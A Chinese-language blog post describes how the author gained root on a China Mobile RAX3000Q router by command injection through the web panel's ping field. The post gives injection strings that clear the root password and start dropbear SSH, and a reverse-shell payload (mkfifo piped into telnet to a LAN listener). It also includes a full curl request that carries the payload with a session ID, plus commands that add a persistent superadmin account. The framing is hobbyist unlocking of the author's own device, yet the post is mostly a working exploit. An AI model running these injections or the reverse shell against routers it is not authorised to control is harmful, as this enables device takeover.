---
title: "中国移动Rax3000q路由器开启ssh/telnet，解锁超级管理员"
date: 2022-09-05T10:42:27+08:00
draft: false
categories: ['其他']
tags: ["2022",'openwrt']
---

> 本文基于软件版本：V1.1.1.202204141725，硬件版本 TZ7.823.346A 的中国移动 RAX3000Q 路由器

## 给不想折腾的用户

有一些高级功能在前端不展示，但是登录后台之后直接访问相应链接即可使用
```
http://192.168.10.1/#/home/diagnosis/tcpdump（远程抓包设置）
http://192.168.10.1/#/home/diagnosis/packetcapture（抓包设置）
http://192.168.10.1/#/home/network/tr069（Tr069远程下发设置）
http://192.168.10.1/#/home/network/fotaSetting（和苗FOTA设置）（重启后失效）
http://192.168.10.1/#/home/network/andLink（andlink设置）
http://192.168.10.1/#/home/network/routeList（静态路由）
```
把上面的192.168.10.1改成你设置的路由访问IP即可

感谢[大佬](https://github.com/KB5201314/KB5201314.github.io/issues/4#issuecomment-1105011298)提供

## 纯干货阶段
- 删除 root 密码
    - 在web面板「诊断 - ping」页面的ip地址输入框填入以下内容后点击开始（页面没有反应，不过不用担心，执行了就行）：
    
        `$(passwd${IFS}-d${IFS}root)`
    
- 开启 ssh 服务
    - ping 输入框有长度限制且不能输入空格，我们这里使用 ${IFS} 替换空格，下面命令表示在22端口启动 dropbear ssh 服务
    - 在web面板「诊断 - ping」页面的ip地址输入框填入以下内容后点击开始：
    
        `$(dropbear${IFS}-p${IFS}22)`

- 通过 ssh 连接路由
    - 此时的 ssh 运行在 22 端口，登录后记得用`passwd`修改root账号密码
        
        `ssh -p 22 root@172.16.2.204`

    - 这里需要注意的是，ssh服务的IP是 172.16 网段的（可以通过admin登录路由器后台查看：主页 ——> LAN IP），而不是 192.168.10.1 这个路由器管理后台，我被这个东西卡了好久。登录后记得用`passwd`修改root账号密码

- 更改 dropbear 配置并设置自启
    - 编辑 dropbear 配置文件
        `vi /etc/config/dropbear`
    - 改为下面这个样子，只是修改端口和 enable 值，关于vi的使用自己百度一下吧
        ```
        config dropbear
            option PasswordAuth 'on'
            option RootPasswordAuth 'on'
            option Port         '22'
            option enable       '1' 
        ```

    - 打开 dropbear 自动启动： 
        
        `/etc/init.d/dropbear enable`

    - 启动 dropbear: (注入启动 dropbear 时占用了22 端口，可以直接重启路由看看是否有效）
    
        `/etc/init.d/dropbear start` 

- 超级管理员（被坑了好几小时）
    
    杀千刀的程序员写了一个脚本，开机后清除超级管理员账号，关键是优先级比较低，把我写的开机运行脚本都覆盖了，一直以为是我的方法没生效

    - 添加超级管理员账号（ssh登录）
        
        添加超级管理员用户: `mdlcfg -a SYS_SUPER_LOGIN_NAME="superadmin"`
        
        添加管理员密码: `mdlcfg -a SYS_SUPER_LOGIN_PWD="83583000"`

        账户密码都是可以自己设置的，不固定。此时你已经可以用设置的超管账号登录路由器后台了


    - 修改开机自动运行脚本
        `vi /etc/init.d/tz_process_start`

        这里要修改的主要有两处，首先是最后一段

        ```
        super_login_name=$(mdlcfg -g SYS_SUPER_LOGIN_NAME)
        if [ -n "$super_login_name" ]; then
            mdlcfg -d SYS_SUPER_LOGIN_NAME
            mdlcfg -d SYS_SUPER_LOGIN_PWD
            mdlcfg -d SYS_WEB_SUPER_PWD_RULE
            mdlcfg -d SYS_SENIOR_LOGIN_NAME
            mdlcfg -d SYS_SENIOR_LOGIN_PWD
            mdlcfg -d SYS_WEB_SENIOR_PWD_RULE
            mdlcfg -d SYS_WEB_SENIOR_PWD_HEAD
            mdlcfg -c
        fi
        ```

        我是直接删除的，这段删完后，重启就不会自动删除超级管理员账号了

        然后往上找到这段，关于FOTA，我也是直接删除了，在后台关闭 FOTA 是不生效的，就是因为这段脚本
        ```
        #和苗FOTA启动
        /bin/fota_start.sh restart >dev/null 2>&1 &
        ```

        其他的我就没动了

## 详细折腾过程

偶然看到一个介绍百元 WiFi6 的[帖子](https://post.smzdm.com/p/a0qe6xd8/)，想起来自己的路由器也好几年没换了，该升级一下了，在多番搜索之后选择了一个可以破解使用openwrt的型号：中国移动RAX3000Q，
只花了115就拿下了

拿到手之后我傻了，在原来那篇[破解帖子](https://blog.imlk.top/posts/rax3000q-get-shell/)之后，到我这里已经至少是第三个迭代了，删掉了luci，添加了重启删除超管账号脚本，折腾的我好累

首先最顺利的肯定就是删除root密码了，但是没法验证。

然后在[破解帖子](https://blog.imlk.top/posts/rax3000q-get-shell/)的评论区看到可以通过注入 `$(dropbear)`启动ssh服务，但是我连接的时候首先 IP 用错了，
其次 dropbear 的默认端口是被改掉了的，所以无论如何我都是连接不上了

然后通过反弹 shell 登录了服务器
### 反弹shell

反弹 shell 也是通过路由器的ping功能实现的，但是这里不能直接执行shell注入命令，因为：
- 输入框不能输入空格（使用`${IFS}`替换）
- 输入框有长度限制

我的解决办法是打开 F12，在前台输入 `$(id)` ，点击运行，以curl(bash)格式复制这条命令

然后使用反弹shell语句替换 `$(id)`，再在Linux执行curl语句

反弹shell语句为：

`$(TF=$(mktemp -u);mkfifo $TF && telnet 172.28.43.7 1031 0<$TF | ash 1>$TF)`

这里的 `172.28.43.7` 需要替换为你本地Linux的局域网地址

那么我们就有了如下步骤：

1. 在本地Linux开启端口监听： `nc -lvnp 1031`
2. 在同一局域网的Linux设备执行下面的命令

```
curl 'http://192.168.10.1/cgi-bin/http.cgi' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,ar;q=0.8' \
  -H 'Content-Type: application/json;charset=UTF-8' \
  -H 'Origin: http://192.168.10.1' \
  -H 'Proxy-Connection: keep-alive' \
  -H 'Referer: http://192.168.10.1/' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36' \
  --data-raw '{"cmd":168,"subcmd":0,"pingTimes":10,"url":"$(TF=$(mktemp -u);mkfifo $TF && telnet 172.28.43.7 1031 0<$TF | ash 1>$TF)","method":"POST","sessionId":"51f8df5e4301e3f5dd3af3117f1118a15eeb71c64ee71293d05ee4d1065e759b"}' \
  --compressed \
  --insecure
```

上面的指令大家都可以用，只不过有些地方需要修改；
- 所有的 `192.168.10.1` 修改为你的路由器管理地址
- "url":"$(TF=$(mktemp -u);mkfifo $TF && telnet 172.28.43.7 1031 0<$TF | ash 1>$TF)" 中`172.28.43.7`改为自己的本地Linux IP
- "sessionId":"51f8df5e4301e3f5dd3af3117f1118a15eeb71c64ee71293d05ee4d1065e759b"}' 中，sessionId的值需要F12后拿到自己的sessionId替换
    
    F12后点击网络，任意点击一个 http.cgi 请求，点击载荷就可以看到本次会话的sessionId

3. 这时你的本地Linux监听页就会显示已连接上远程服务器，你可以输入 `/usr/sbin/dropbear -p 22` 在22端口开启ssh

## 后续设置

前一天晚上搞到3点，早上复盘写文章的时候才灵光突现想到只需要注入 `$(dropbear${IFS}-p${IFS}22)` 就可以在22端口开启ssh了，废了好多力气去搞反弹shell

剩下的设置都在上方干货区域了

后续会尝试安装一下 LuCI